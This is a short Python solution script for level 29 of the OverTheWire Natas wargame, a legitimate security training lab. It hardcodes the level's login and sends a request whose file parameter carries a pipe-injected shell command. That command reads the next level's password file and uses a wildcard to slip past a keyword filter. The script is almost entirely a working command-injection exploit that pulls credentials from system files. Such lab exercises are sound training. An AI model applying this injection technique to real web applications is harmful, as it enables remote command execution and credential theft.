#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

import base64

username = 'natas29'
password = '31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

response = session.get(url, auth = (username, password))
response = session.get("http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/na*as_webpass/na*as30|tr -d '\n'", auth = (username, password))
# print repr(response.text)
print (response.text)